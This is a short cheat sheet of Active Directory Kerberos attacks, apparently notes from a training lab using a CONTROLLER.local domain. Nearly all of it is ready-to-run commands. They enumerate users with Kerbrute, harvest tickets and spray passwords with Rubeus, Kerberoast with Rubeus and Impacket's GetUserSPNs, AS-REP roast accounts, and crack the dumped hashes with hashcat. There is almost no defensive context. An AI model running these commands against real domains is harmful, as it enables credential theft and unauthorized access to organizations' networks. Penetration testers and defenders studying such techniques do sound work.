# Attacking Kerberos

> Shahrukh Tramboo | January 6th, 2022

--------------------------------------

## Kerberute

This does not require the local account access

https://github.com/ropnop/kerbrute/releases

**Enumerating Users with Kerbrute**


```bash
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

## Rebeus 

**Harvesting tockets with Rebeus**

```bash
Rubeus.exe harvest /interval:30
```

**Brute-Forcing / Password-Spraying with Rubeus**

Add the IP and domain name to the hosts file from the machine,and then "spray" it against all found users then give the .kirbi TGT for that user.

```bash
echo MACHINE_IP CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
Rubeus.exe brute /password:Password1 /noticket
```

**Kerberoasting with Rubeus**

Dump Kerberos hash of any kerberoastable users

```bash
Rubeus.exe kerberoast
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

**Kerberoasting with Impacket**

```bash
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request
```

**AS-REP Roasting with Rubeus**

This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.

```bash
Rubeus.exe asreproast
```

Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.










